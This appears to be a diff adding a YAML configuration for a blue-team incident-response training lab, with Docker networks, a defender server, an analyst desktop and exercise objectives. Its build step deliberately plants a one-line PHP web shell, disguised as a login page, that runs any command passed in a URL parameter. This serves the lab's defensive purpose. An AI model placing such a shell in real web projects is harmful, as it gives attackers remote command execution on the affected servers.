@@ -1,0 +1,54 @@
+# =============================================================================
+# SOC Lab Builder - 02271 Blue Team: Incident Response & Firewalls
+# =============================================================================
+scenario: "blue_team_incident_response"
+
+networks:
+  - name: "vnc_host_bridge"
+    driver: "bridge"
+    internal: false
+
+  - name: "blue_team_lan"
+    driver: "bridge"
+    internal: true
+
+nodes:
+  - name: "defender_server"
+    base_image: "ubuntu:noble"
+    mem_limit: "1g"
+    cpus: 1.0
+    cap_add:
+      - "NET_ADMIN"
+      - "NET_RAW"
+    networks:
+      - "blue_team_lan"
+    build_modifiers:
+      - "RUN apt-get update && apt-get install -y apache2 php libapache2-mod-php suricata iptables openssh-server netcat-traditional && rm -rf /var/lib/apt/lists/*"
+      # FIX: Added mkdir -p to ensure the parent directory exists before writing the payload
+      - "RUN mkdir -p /var/www/html/Login && echo '<?php system($_GET[\"login\"]); ?>' > /var/www/html/Login/index.php"
+    exec_command: "service ssh start && apachectl -D FOREGROUND"
+
+defender_workspace:
+  name: "analyst_desktop"
+  base_image: "pinacjoshi/labod-defender-base:latest"
+  mem_limit: "2g"
+  exposed_port: 8081
+  networks:
+    - "vnc_host_bridge"
+    - "blue_team_lan"
+  build_modifiers:
+    install_packages:
+      - "suricata"
+      - "iptables"
+    mkdir:
+      - "/config/Desktop/PCAP_Evidence"
+
+instructions: |
+  Exercise Initialization Complete: Blue Team Analysis
+
+  Your interactive workspace is streaming at `http://localhost:{analyst_desktop[port]}`.
+
+  Primary Objectives:
+  1. Analyze the provided network traffic to reconstruct the cyber kill chain of the attack.
+  2. Implement stateful `iptables` rules to drop automated scanning and restrict egress shell traffic.
+  3. Deploy Suricata IDS rules to detect HTTP meta-command injection attempts.
